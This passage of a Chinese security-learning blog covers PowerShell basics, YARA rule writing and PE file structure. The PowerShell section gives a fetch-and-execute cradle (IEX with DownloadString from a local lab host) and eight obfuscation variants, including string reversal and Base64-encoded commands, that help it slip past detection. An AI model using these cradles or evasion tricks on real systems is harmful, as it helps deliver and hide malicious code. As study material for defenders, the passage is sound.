<h4 id="0x08-文件下载"><a href="#0x08-文件下载" class="headerlink" title="0x08 文件下载"></a>0x08 文件下载</h4><p><code>invoke-webrequest -Uri $url -OutFile $output</code></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$url</span> = <span class="string">&quot;http://www.baidu.com&quot;</span></span><br><span class="line"><span class="variable">$output</span> = <span class="string">&quot;F:\1.html&quot;</span></span><br><span class="line"><span class="built_in">invoke-webrequest</span> <span class="literal">-Uri</span> <span class="variable">$url</span> <span class="literal">-OutFile</span> <span class="variable">$output</span></span><br></pre></td></tr></table></figure>

<p><code>(New-Object System.Net.WebClient).DownloadFile($url,$output)</code> </p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$url</span> = <span class="string">&quot;http://www.baidu.com&quot;</span></span><br><span class="line"><span class="variable">$output</span> = <span class="string">&quot;F:\2.html&quot;</span></span><br><span class="line">(<span class="built_in">New-Object</span> System.Net.WebClient).DownloadFile(<span class="variable">$url</span>,<span class="variable">$output</span>) </span><br></pre></td></tr></table></figure>

<br>

<h4 id="0x09-文件操作"><a href="#0x09-文件操作" class="headerlink" title="0x09 文件操作"></a>0x09 文件操作</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 新建目录test</span></span><br><span class="line"><span class="built_in">New-Item</span> test <span class="literal">-ItemType</span> directory </span><br><span class="line"><span class="comment"># 删除目录test</span></span><br><span class="line"><span class="built_in">Remove-Item</span> test </span><br><span class="line"><span class="comment"># 新建文件test.txt</span></span><br><span class="line"><span class="built_in">New-Item</span> test.txt <span class="literal">-ItemType</span> file </span><br><span class="line"><span class="comment"># 新建文件test.txt，内容为 test</span></span><br><span class="line"><span class="built_in">New-Item</span> test.txt <span class="literal">-ItemType</span> file <span class="literal">-value</span> <span class="string">&quot;test&quot;</span> </span><br><span class="line"><span class="comment"># 删除文件test.txt</span></span><br><span class="line"><span class="built_in">Remove-Item</span> test.txt </span><br><span class="line"><span class="comment"># 查看文件test.txt内容</span></span><br><span class="line"><span class="built_in">Get-Content</span> test.txt </span><br><span class="line"><span class="comment"># 设置文件test.txt内容t</span></span><br><span class="line"><span class="built_in">Set-Content</span> test.txt <span class="literal">-Value</span> <span class="string">&quot;test&quot;</span> </span><br><span class="line"><span class="comment"># 给文件test.txt追加内容</span></span><br><span class="line"><span class="built_in">Add-Content</span> test.txt <span class="literal">-Value</span> <span class="string">&quot;,test2&quot;</span> </span><br><span class="line"><span class="comment"># 清除文件test.txt内容</span></span><br><span class="line"><span class="built_in">Clear-Content</span> test.txt</span><br></pre></td></tr></table></figure>

<br>

<h4 id="0x0a-简单混淆"><a href="#0x0a-简单混淆" class="headerlink" title="0x0a 简单混淆"></a>0x0a 简单混淆</h4><p><code>Invoke-Expression (New-Object System.Net.WebClient).DownloadString(&quot;http://127.0.0.1:8000/1.txt&quot;)</code></p>
<br>

<ul>
<li>1.去掉System关键词</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Invoke-Expression</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&quot;http://127.0.0.1:8000/1.txt&quot;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>2.使用字符串连接+号连接</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Invoke-Expression</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;h&#x27;</span>+<span class="string">&#x27;ttp://127.0.0.1:8000/1.txt&#x27;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>3.使用Invoke方法</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Invoke-Expression</span> (<span class="built_in">New-Object</span> Net.WebClient).(<span class="string">&quot;DownloadString&quot;</span>).Invoke(<span class="string">&#x27;h&#x27;</span>+<span class="string">&#x27;ttp://127.0.0.1:8000/1.txt&#x27;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>4.变量替代</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ds</span>=<span class="string">&quot;Down&quot;</span>+<span class="string">&quot;loadString&quot;</span>;</span><br><span class="line"><span class="built_in">Invoke-Expression</span> (<span class="built_in">New-Object</span> Net.WebClient).<span class="variable">$ds</span>.Invoke(<span class="string">&#x27;h&#x27;</span>+<span class="string">&#x27;ttp://127.0.0.1:8000/1.txt&#x27;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>5.关键词使用单双引号引起来</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Invoke-Expression</span> (<span class="built_in">New-Object</span> Net.WebClient).<span class="string">&quot;DownloadString&quot;</span>(<span class="string">&#x27;h&#x27;</span>+<span class="string">&#x27;ttp://127.0.0.1/powershell&#x27;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>6.转义符号</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Invoke-Expression</span> (<span class="built_in">New-Object</span> Net.WebClient).<span class="string">&quot;D o wn l oad Str in g&quot;</span>(<span class="string">&#x27;h&#x27;</span>+<span class="string">&#x27;ttp://127.0.0.1:8000/1.txt&#x27;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>7.字符串反转</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$re</span>= <span class="string">&quot;)&#x27;txt.1/0008:1.0.0.721//:ptth&#x27;(gnirtSdaolnwoD.)tneilCbeW.teN tcejbO-weN(&quot;</span>;</span><br><span class="line">(<span class="variable">$re</span>[-<span class="number">1</span><span class="type">..</span>-(<span class="variable">$re</span><span class="type">.Length</span>)] <span class="operator">-Join</span> <span class="string">&#x27;&#x27;</span>) | <span class="built_in">IEX</span></span><br></pre></td></tr></table></figure>

<ul>
<li>8.编码执行</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$command</span> = <span class="string">&quot;Invoke-Expression (New-Object Net.WebClient).DownloadString(&#x27;h&#x27;+&#x27;ttp://127.0.0.1:8000/1.txt&#x27;)&quot;</span></span><br><span class="line"><span class="variable">$bytes</span> = [<span class="type">System.Text.Encoding</span>]::Unicode.GetBytes(<span class="variable">$command</span>)</span><br><span class="line"><span class="variable">$encodedCommand</span> = [<span class="type">Convert</span>]::ToBase64String(<span class="variable">$bytes</span>)</span><br><span class="line">powershell.exe <span class="literal">-EncodedCommand</span> <span class="variable">$encodedCommand</span></span><br></pre></td></tr></table></figure>

<h5 id="混淆工具"><a href="#混淆工具" class="headerlink" title="混淆工具"></a>混淆工具</h5><p> Invoke-Obfuscation</p>
<p><a href="https://github.com/danielbohannon/Invoke-Obfuscation">https://github.com/danielbohannon/Invoke-Obfuscation</a></p>
<p>Revoke-Obfuscation</p>
<br>

<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://gsh3ll.top/2021/12/18/%E3%80%90%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0%E3%80%91PowerShell%E5%9F%BA%E7%A1%80/</span><br><span class="line">https://cloud.tencent.com/developer/article/1639161</span><br><span class="line">https://www.secrss.com/articles/20119</span><br><span class="line">https://www.cnblogs.com/linuxsec/articles/7384582.html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>Yara规则学习-01</title>
    <url>/posts/db5cae05/</url>
    <content><![CDATA[<h3 id="官方demo"><a href="#官方demo" class="headerlink" title="官方demo"></a>官方demo</h3><p><a href="https://github.com/VirusTotal/yara">https://github.com/VirusTotal/yara</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rule silent_banker : banker</span><br><span class="line">&#123;</span><br><span class="line">    meta:</span><br><span class="line">        description = &quot;This is just an example&quot;</span><br><span class="line">        threat_level = 3</span><br><span class="line">        in_the_wild = true</span><br><span class="line"></span><br><span class="line">    strings:</span><br><span class="line">        $a = &#123;6A 40 68 00 30 00 00 6A 14 8D 91&#125;</span><br><span class="line">        $b = &#123;8D 4D B0 2B C1 83 C0 27 99 6A 4E 59 F7 F9&#125;</span><br><span class="line">        $c = &quot;UVODFRYSIHLNWPEJXQZAKCBGMT&quot;   //样本中出现的机器码或者字符串</span><br><span class="line"></span><br><span class="line">    condition:</span><br><span class="line">        $a or $b or $c          // 满足其中一个条件即可进行匹配</span><br><span class="line">&#125;c</span><br></pre></td></tr></table></figure>

<br>

<h3 id="Yara规则语法"><a href="#Yara规则语法" class="headerlink" title="Yara规则语法"></a>Yara规则语法</h3><p>一般包含3部分，分别为 meta  string condition</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rule RuleName</span><br><span class="line">&#123;</span><br><span class="line">    meta:           //该规则的基础信息</span><br><span class="line">    strings:        //用来定义字符串</span><br><span class="line">    condition:      //编写表达式处理strings中的字符串</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="rule命名规则"><a href="#rule命名规则" class="headerlink" title="rule命名规则"></a>rule命名规则</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.英文或字母组成的字符串</span><br><span class="line">2.可以使用下划线</span><br><span class="line">3.第一个字符禁止为数字</span><br><span class="line">4.大小写敏感</span><br><span class="line">5.不可以大于128个字符长度</span><br></pre></td></tr></table></figure>

<h4 id="Yara规则支持字符串、正则表达式、十六进制进行匹配。"><a href="#Yara规则支持字符串、正则表达式、十六进制进行匹配。" class="headerlink" title="Yara规则支持字符串、正则表达式、十六进制进行匹配。"></a>Yara规则支持字符串、正则表达式、十六进制进行匹配。</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">字符串：定义一个变量 $a = “字符串内容”</span><br><span class="line"></span><br><span class="line">正则表达式：定义一个变量 $a = /正则表达式内容/</span><br><span class="line"></span><br><span class="line">十六进制：定义一个变量 $a = &#123;十六进制内容&#125;     </span><br><span class="line">#可以使用 ？ 作为通配符</span><br><span class="line">$hex1 = &#123; EF E4 ?8 D8 ?? FB&#125;</span><br><span class="line">#不定长字符串可以用 [3-5]表示 无限长可以用[-]表示</span><br><span class="line">$hex2 = &#123; EF E4 [-] A2 FB&#125;</span><br><span class="line">$hex3 = &#123; EF E4 [2-4] D8 A2 FB&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Yara规则常用修饰符"><a href="#Yara规则常用修饰符" class="headerlink" title="Yara规则常用修饰符"></a>Yara规则常用修饰符</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nocase：不区分大小写</span><br><span class="line">base64：base64字符串</span><br><span class="line">xor：异或字符串</span><br><span class="line">wide：宽字符</span><br></pre></td></tr></table></figure>

<h4 id="Yara规则条件"><a href="#Yara规则条件" class="headerlink" title="Yara规则条件"></a>Yara规则条件</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 布尔运算</span><br><span class="line">and：与   or：或   not：非</span><br><span class="line">all of them：         //匹配所有条件即告警</span><br><span class="line">any of them：         //匹配到其中一个条件即告警</span><br><span class="line">$a and $b and $c：    //同时匹配到abc即告警</span><br><span class="line">($a and $b) or $c：   //匹配到a和b或c即告警</span><br><span class="line">$a and $b and $c：    //同时匹配到abc即告警</span><br><span class="line">($a and $b) or $c：   //匹配到a和b或c即告警</span><br><span class="line"></span><br><span class="line"># 文件大小</span><br><span class="line">filesize &gt; 200KB</span><br><span class="line"></span><br><span class="line"># 访问指定位置数据</span><br><span class="line">unint16(0) and unit32(unit32(0x3c)) == 0x00004550</span><br></pre></td></tr></table></figure>

<h4 id="Yara编写"><a href="#Yara编写" class="headerlink" title="Yara编写"></a>Yara编写</h4><p>先略过 后续有时间再搞一下</p>
<br>

<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p><code>pip install yara-python</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> yara</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取目录内的yara规则文件</span></span><br><span class="line"><span class="comment"># 将yara规则编译</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getRules</span>(<span class="params">path</span>):</span><br><span class="line">  filepath = &#123;&#125;</span><br><span class="line">  <span class="keyword">for</span> index, file <span class="keyword">in</span> <span class="built_in">enumerate</span>(os.listdir(path)):</span><br><span class="line">    rupath = os.path.join(path, file)</span><br><span class="line">    key = <span class="string">&quot;rule&quot;</span> + <span class="built_in">str</span>(index)</span><br><span class="line">    filepath[key] = rupath</span><br><span class="line">    <span class="built_in">print</span>(rupath)</span><br><span class="line">    </span><br><span class="line">  yararule = yara.<span class="built_in">compile</span>(filepaths=filepath)</span><br><span class="line">  <span class="built_in">print</span>(filepath)</span><br><span class="line">  <span class="built_in">print</span>(yararule)</span><br><span class="line">  <span class="keyword">return</span> yararule</span><br><span class="line">  </span><br><span class="line"><span class="comment"># 扫描函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scan</span>(<span class="params">rule, path</span>):</span><br><span class="line">  <span class="keyword">for</span> file <span class="keyword">in</span> os.listdir(path):</span><br><span class="line">    mapath = os.path.join(path, file)</span><br><span class="line">    <span class="built_in">print</span> (malpath+<span class="string">&quot;\\&quot;</span>+file)</span><br><span class="line">    fp = <span class="built_in">open</span>(malpath+<span class="string">&quot;\\&quot;</span>+file, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">    matches = rule.<span class="keyword">match</span>(data=fp.read())</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(matches) &gt; <span class="number">0</span>:</span><br><span class="line">      <span class="built_in">print</span> (file, matches)</span><br><span class="line">      </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  rulepath = <span class="string">&quot;F:\\yara\\rules&quot;</span> <span class="comment"># yara规则目录</span></span><br><span class="line">  malpath =<span class="string">&quot;F:\\yara\\samples&quot;</span> <span class="comment"># simple目录</span></span><br><span class="line">  <span class="comment"># yara规则编译函数调用</span></span><br><span class="line">  yararule = getRules(rulepath)</span><br><span class="line">  <span class="comment"># 扫描函数调用</span></span><br><span class="line">  scan(yararule, malpath)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<br>

<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://lengjibo.github.io/yara/</span><br><span class="line">https://zhuanlan.kanxue.com/article-17369.htm</span><br><span class="line">https://toutiao.io/posts/05scc8/preview</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>PE结构学习</title>
    <url>/posts/d8527941/</url>
    <content><![CDATA[<h3 id="PE文件结构"><a href="#PE文件结构" class="headerlink" title="PE文件结构"></a>PE文件结构</h3><h4 id="1-可执行文件"><a href="#1-可执行文件" class="headerlink" title="1.可执行文件"></a>1.可执行文件</h4><p>在windows平台下的可执行文件的格式，成为PE文件结构（Portable Executable）；</p>
<p>在Linux平台下的可执行文件格式成为ELF文件结构（Executable and Linking Format）</p>
<br>

<h4 id="2-PE指纹"><a href="#2-PE指纹" class="headerlink" title="2.PE指纹"></a>2.PE指纹</h4><p>在初始位置为 4D 5A （十进制为MZ） 而在0x3c后 有一个0x0100h（） 指向0x0100h（PE）处</p>
<p><img src="/posts/d8527941/1.png"></p>
<br>

<h4 id="3-PE整体结构"><a href="#3-PE整体结构" class="headerlink" title="3.PE整体结构"></a>3.PE整体结构</h4><p>下图是在github上大佬滴水的学习笔记上截的</p>
<p><img src="/posts/d8527941/2.png"></p>
<p><img src="/posts/d8527941/3.png"></p>
<br>

<p>在visual studio中 可以调用 &lt;windows.h&gt;去查看PE的结构体</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">_IMAGE_DOS_HEADER;</span><br><span class="line">_IMAGE_NT_HEADERS;</span><br><span class="line">_IMAGE_SECTION_HEADER</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>其中WORD类型 占2字节；DOWRD类型 占4个字节；BYTE类型 占1个字节</p>
<p>也可以调用python中的<code>pefile</code>库查看pe文件结构 (pip install pefile)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pefile</span><br><span class="line"></span><br><span class="line">pe = pefile.PE(<span class="string">&#x27;1.exe&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(pe)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/posts/d8527941/4.png"></p>
<br>

<h4 id="4-PE文件整体结构解析"><a href="#4-PE文件整体结构解析" class="headerlink" title="4.PE文件整体结构解析"></a>4.PE文件整体结构解析</h4><h5 id="4-1-DOS头"><a href="#4-1-DOS头" class="headerlink" title="4.1 DOS头"></a>4.1 DOS头</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">typedef struct _IMAGE_DOS_HEADER &#123;      // DOS .EXE header</span><br><span class="line">    WORD   e_magic;                     // Magic number</span><br><span class="line">    WORD   e_cblp;                      // Bytes on last page of file</span><br><span class="line">    WORD   e_cp;                        // Pages in file</span><br><span class="line">    WORD   e_crlc;                      // Relocations</span><br><span class="line">    WORD   e_cparhdr;                   // Size of header in paragraphs</span><br><span class="line">    WORD   e_minalloc;                  // Minimum extra paragraphs needed</span><br><span class="line">    WORD   e_maxalloc;                  // Maximum extra paragraphs needed</span><br><span class="line">    WORD   e_ss;                        // Initial (relative) SS value</span><br><span class="line">    WORD   e_sp;                        // Initial SP value</span><br><span class="line">    WORD   e_csum;                      // Checksum</span><br><span class="line">    WORD   e_ip;                        // Initial IP value</span><br><span class="line">    WORD   e_cs;                        // Initial (relative) CS value</span><br><span class="line">    WORD   e_lfarlc;                    // File address of relocation table</span><br><span class="line">    WORD   e_ovno;                      // Overlay number</span><br><span class="line">    WORD   e_res[4];                    // Reserved words</span><br><span class="line">    WORD   e_oemid;                     // OEM identifier (for e_oeminfo)</span><br><span class="line">    WORD   e_oeminfo;                   // OEM information; e_oemid specific</span><br><span class="line">    WORD   e_res2[10];                  // Reserved words</span><br><span class="line">    LONG   e_lfanew;                    // File address of new exe header</span><br><span class="line">  &#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;</span><br></pre></td></tr></table></figure>

<p> WORD   e_magic;                         // Magic number 标志位(MZ 4D5A 占2个字节)</p>
<p>Long  e_lfanew;                            // File address of new exe header 偏移位置（指向下一个文件前面）</p>
<br>

<h5 id="4-2-PE-NT-文件头"><a href="#4-2-PE-NT-文件头" class="headerlink" title="4.2 PE(NT)文件头"></a>4.2 PE(NT)文件头</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">typedef struct _IMAGE_NT_HEADERS &#123;</span><br><span class="line">    DWORD Signature;                        //PE标识</span><br><span class="line">    IMAGE_FILE_HEADER FileHeader;           //标准PE头</span><br><span class="line">    IMAGE_OPTIONAL_HEADER32 OptionalHeader; //拓展PE头</span><br><span class="line">&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>第一部分为PE文件头标志，<code>DWORD Signature;</code> （50450000 dowrd占4个字节）</p>
<h6 id="4-2-1-标准PE头"><a href="#4-2-1-标准PE头" class="headerlink" title="4.2.1 标准PE头"></a>4.2.1 标准PE头</h6><p>第二部分为<code>IMAGE_FILE_HEADER</code> 占20字节 称之为标准PE头</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">typedef struct _IMAGE_FILE_HEADER &#123;</span><br><span class="line">    WORD    Machine;                      //识别CPU</span><br><span class="line">    WORD    NumberOfSections;             //表示节的数量</span><br><span class="line">    DWORD   TimeDateStamp;                //时间戳</span><br><span class="line">    DWORD   PointerToSymbolTable;         //调试相关</span><br><span class="line">    DWORD   NumberOfSymbols;              //调试相关</span><br><span class="line">    WORD    SizeOfOptionalHeader;         //拓展PE头的大小</span><br><span class="line">    WORD    Characteristics;              //文件属性</span><br><span class="line">&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER; </span><br></pre></td></tr></table></figure>

<p>第一个成员 <code>WORD Machine</code> CPU识别</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#define IMAGE_FILE_MACHINE_UNKNOWN 0</span><br><span class="line">#define IMAGE_FILE_MACHINE_TARGET_HOST 0x0001 // Useful for indicating we want to interact with the host and not a WoW guest.</span><br><span class="line">#define IMAGE_FILE_MACHINE_I386 0x014c // Intel 386.</span><br><span class="line">#define IMAGE_FILE_MACHINE_R3000 0x0162 // MIPS little-endian,</span><br><span class="line">0x160 big-endian</span><br><span class="line">#define IMAGE_FILE_MACHINE_R4000 0x0166 // MIPS little-endian</span><br><span class="line">#define IMAGE_FILE_MACHINE_R10000 0x0168 // MIPS little-endian</span><br><span class="line">#define IMAGE_FILE_MACHINE_WCEMIPSV2 0x0169 // MIPS little-endian WCEv2</span><br><span class="line">#define IMAGE_FILE_MACHINE_ALPHA 0x0184 // Alpha_AXP</span><br><span class="line">#define IMAGE_FILE_MACHINE_SH3 0x01a2 // SH3 little-endian</span><br><span class="line">#define IMAGE_FILE_MACHINE_SH3DSP 0x01a3</span><br><span class="line">#define IMAGE_FILE_MACHINE_SH3E 0x01a4 // SH3E little-endian</span><br><span class="line">#define IMAGE_FILE_MACHINE_SH4 0x01a6 // SH4 little-endian</span><br><span class="line">#define IMAGE_FILE_MACHINE_SH5 0x01a8 // SH5</span><br><span class="line">#define IMAGE_FILE_MACHINE_ARM 0x01c0 // ARM Little-Endian</span><br><span class="line">#define IMAGE_FILE_MACHINE_THUMB 0x01c2 // ARM Thumb/Thumb-2Little-Endian</span><br><span class="line">#define IMAGE_FILE_MACHINE_ARMNT 0x01c4 // ARM Thumb-2 LittleEndian</span><br><span class="line">#define IMAGE_FILE_MACHINE_AM33 0x01d3</span><br><span class="line">#define IMAGE_FILE_MACHINE_POWERPC 0x01F0 // IBM PowerPC LittleEndian</span><br><span class="line">#define IMAGE_FILE_MACHINE_POWERPCFP 0x01f1</span><br><span class="line">#define IMAGE_FILE_MACHINE_IA64 0x0200 // Intel 64</span><br><span class="line">#define IMAGE_FILE_MACHINE_MIPS16 0x0266 // MIPS</span><br><span class="line">#define IMAGE_FILE_MACHINE_ALPHA64 0x0284 // ALPHA64</span><br><span class="line">#define IMAGE_FILE_MACHINE_MIPSFPU 0x0366 // MIPS</span><br><span class="line">#define IMAGE_FILE_MACHINE_MIPSFPU16 0x0466 // MIPS</span><br><span class="line">#define IMAGE_FILE_MACHINE_AXP64 IMAGE_FILE_MACHINE_ALPHA64</span><br><span class="line">#define IMAGE_FILE_MACHINE_TRICORE 0x0520 // Infineon</span><br><span class="line">#define IMAGE_FILE_MACHINE_CEF 0x0CEF</span><br><span class="line">#define IMAGE_FILE_MACHINE_EBC 0x0EBC // EFI Byte Code</span><br><span class="line">#define IMAGE_FILE_MACHINE_AMD64 0x8664 // AMD64 (K8)</span><br><span class="line">#define IMAGE_FILE_MACHINE_M32R 0x9041 // M32R little-endian</span><br><span class="line">#define IMAGE_FILE_MACHINE_ARM64 0xAA64 // ARM64 Little-Endian</span><br><span class="line">#define IMAGE_FILE_MACHINE_CEE 0xC0EE</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>第二个成员 <code>WORD NumberOfSections</code> 表示当前PE文件中节的数量</p>
<p>第三个成员<code>DWORD TimeDateStamp</code>    表示编译器编译时的时间戳</p>
<p>第四个成员<code>DWORD PointerToSymbolTable</code> 和第五个成员<code>DWORD NumberOfSymbols</code>为调试相关暂不去了解</p>
<p>第六个成员<code>WORD SizeOfOptionalHeader</code> 表示PE拓展头的大小</p>
<p>第七个成员<code>WORD Characteristics;</code> 表示当前PE文件属性</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#define IMAGE_FILE_RELOCS_STRIPPED           0x0001  // Relocation info stripped from file.</span><br><span class="line">#define IMAGE_FILE_EXECUTABLE_IMAGE          0x0002  // File is executable  (i.e. no unresolved external references).</span><br><span class="line">#define IMAGE_FILE_LINE_NUMS_STRIPPED        0x0004  // Line nunbers stripped from file.</span><br><span class="line">#define IMAGE_FILE_LOCAL_SYMS_STRIPPED       0x0008  // Local symbols stripped from file.</span><br><span class="line">#define IMAGE_FILE_AGGRESIVE_WS_TRIM         0x0010  // Aggressively trim working set</span><br><span class="line">#define IMAGE_FILE_LARGE_ADDRESS_AWARE       0x0020  // App can handle &gt;2gb addresses</span><br><span class="line">#define IMAGE_FILE_BYTES_REVERSED_LO         0x0080  // Bytes of machine word are reversed.</span><br><span class="line">#define IMAGE_FILE_32BIT_MACHINE             0x0100  // 32 bit word machine.</span><br><span class="line">#define IMAGE_FILE_DEBUG_STRIPPED            0x0200  // Debugging info stripped from file in .DBG file</span><br><span class="line">#define IMAGE_FILE_REMOVABLE_RUN_FROM_SWAP   0x0400  // If Image is on removable media, copy and run from the swap file.</span><br><span class="line">#define IMAGE_FILE_NET_RUN_FROM_SWAP         0x0800  // If Image is on Net, copy and run from the swap file.</span><br><span class="line">#define IMAGE_FILE_SYSTEM                    0x1000  // System File.</span><br><span class="line">#define IMAGE_FILE_DLL                       0x2000  // File is a DLL.</span><br><span class="line">#define IMAGE_FILE_UP_SYSTEM_ONLY            0x4000  // File should only be run on a UP machine</span><br><span class="line">#define IMAGE_FILE_BYTES_REVERSED_HI         0x8000  // Bytes of machine word are reversed.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<br>

<h6 id="4-2-2-拓展PE头"><a href="#4-2-2-拓展PE头" class="headerlink" title="4.2.2 拓展PE头"></a>4.2.2 拓展PE头</h6><p>第三部分为<code>_IMAGE_OPTIONAL_HEADER</code> PE可选头，在32位下是224字节，在64位下是240字节,下面位32位下的拓展PE头</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">typedef struct _IMAGE_OPTIONAL_HEADER &#123;</span><br><span class="line">    //</span><br><span class="line">    // Standard fields.</span><br><span class="line">    //</span><br><span class="line">    WORD    Magic;                  //文件类型标识  0x10B 32位镜像文件 0x20B;0x107 ROM镜像 ;64位镜像文件</span><br><span class="line">    BYTE    MajorLinkerVersion;</span><br><span class="line">    BYTE    MinorLinkerVersion;</span><br><span class="line">    DWORD   SizeOfCode;             // .text总大小</span><br><span class="line">    DWORD   SizeOfInitializedData;  // .data总大小</span><br><span class="line">    DWORD   SizeOfUninitializedData;// .bss总大小</span><br><span class="line">    DWORD   AddressOfEntryPoint;    // 程序虚拟入口地址</span><br><span class="line">    DWORD   BaseOfCode;             // 代码基址</span><br><span class="line">    DWORD   BaseOfData;             // 数据基址</span><br><span class="line">    //</span><br><span class="line">    // NT additional fields.</span><br><span class="line">    //</span><br><span class="line">    DWORD   ImageBase;              // 程序入口   dll默认是10000000h windwos ce的exe默认是00010000h windows系列exe默认是004000000h</span><br><span class="line">    DWORD   SectionAlignment;       // 内存对齐</span><br><span class="line">    DWORD   FileAlignment;          // 文件对齐</span><br><span class="line">    WORD    MajorOperatingSystemVersion;</span><br><span class="line">    WORD    MinorOperatingSystemVersion;</span><br><span class="line">    WORD    MajorImageVersion;</span><br><span class="line">    WORD    MinorImageVersion;</span><br><span class="line">    WORD    MajorSubsystemVersion;</span><br><span class="line">    WORD    MinorSubsystemVersion;</span><br><span class="line">    DWORD   Win32VersionValue;      </span><br><span class="line">    DWORD   SizeOfImage;            // PE总大小</span><br><span class="line">    DWORD   SizeOfHeaders;          // 头的总大小</span><br><span class="line">    DWORD   CheckSum;               // 校验和(用于检测文件是否被修改)</span><br><span class="line">    WORD    Subsystem;              </span><br><span class="line">    WORD    DllCharacteristics;     //dll文件特性</span><br><span class="line">    DWORD   SizeOfStackReserve;</span><br><span class="line">    DWORD   SizeOfStackCommit;</span><br><span class="line">    DWORD   SizeOfHeapReserve;</span><br><span class="line">    DWORD   SizeOfHeapCommit;</span><br><span class="line">    DWORD   LoaderFlags;</span><br><span class="line">    DWORD   NumberOfRvaAndSizes;</span><br><span class="line">    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];</span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;</span><br></pre></td></tr></table></figure>

<p>WORD Magic;文件类型标识</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x10B表明这是一个32位镜像文件。</span><br><span class="line">0x107表明这是一个ROM镜像。</span><br><span class="line">0x20B表明这是一个64位镜像文件。</span><br></pre></td></tr></table></figure>

<p><code>BYTE MajorLinkerVersion;</code> 链接器主版本号（BYTE 2位16） </p>
<p><code>BYTE MinorLinkerVersion;</code> 链接器副版本号 </p>
<p><code>DWORD SizeOfCode;</code> .text总大小 </p>
<p><code>DWORD SizeOfInitializedData;</code> .data总大小 </p>
<p><code>DWORD SizeOfUninitializedData;</code> .bss总大小 </p>
<p>bss：BSS段通常是指用来存放程序中未初始化的或者初始化为0的全局变量和静态变量的一块内存区域。特点是可读写的，在程序执行之前BSS段会自动清0。</p>
<br>

<p><code>WORD  DllCharacteristics; </code> PE文件特性</p>
